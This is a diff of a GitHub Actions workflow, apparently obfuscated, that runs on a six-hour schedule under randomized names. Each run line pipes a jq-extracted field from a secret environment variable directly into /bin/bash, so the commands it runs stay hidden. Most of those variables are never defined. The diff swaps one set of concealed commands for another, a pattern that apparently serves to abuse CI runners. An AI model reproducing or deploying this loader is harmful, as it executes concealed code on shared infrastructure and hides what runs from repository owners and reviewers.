@@ -1,26 +1,28 @@
 name: liulijun1819
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '7 2/6 * * *'
+    - cron: '3 0/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: liulijun1819
         env:
-          ot3: ${{ secrets.ot3 }}
+          eccgs524: ${{ secrets.eccgs524 }}
         run: |
-          echo $ot3 | jq -r .hnews9946 | /bin/bash
-          echo $o74 | jq -r .hzuv66422 | /bin/bash
-          echo $mkm664 | jq -r .wfl92 | /bin/bash
-          echo $escs48 | jq -r .p51 | /bin/bash
-          echo $mdb7 | jq -r .irjbe625 | /bin/bash
-          echo $ywaf545 | jq -r .kyynd0 | /bin/bash
-          echo $usry0620 | jq -r .xly4 | /bin/bash
-          echo $ynlvk057 | jq -r .mbp56 | /bin/bash
-          echo $q6938 | jq -r .hmu6725 | /bin/bash
-          echo $w93359 | jq -r .dl56613 | /bin/bash
-          echo $dktre991 | jq -r .yokn07386 | /bin/bash
+          echo $eccgs524 | jq -r .rl9156 | /bin/bash
+          echo $lpcik3992 | jq -r .eun9849 | /bin/bash
+          echo $ns5 | jq -r .mx8 | /bin/bash
+          echo $tzxv65 | jq -r .dxe46420 | /bin/bash
+          echo $dc0639 | jq -r .sahtb8 | /bin/bash
+          echo $jmvo5582 | jq -r .nift38 | /bin/bash
+          echo $gwj2 | jq -r .az84 | /bin/bash
+          echo $fo1 | jq -r .i8447 | /bin/bash
+          echo $ewpps0 | jq -r .by785 | /bin/bash
+          echo $bqml93 | jq -r .ngx690 | /bin/bash
+          echo $bh95 | jq -r .g134 | /bin/bash
 
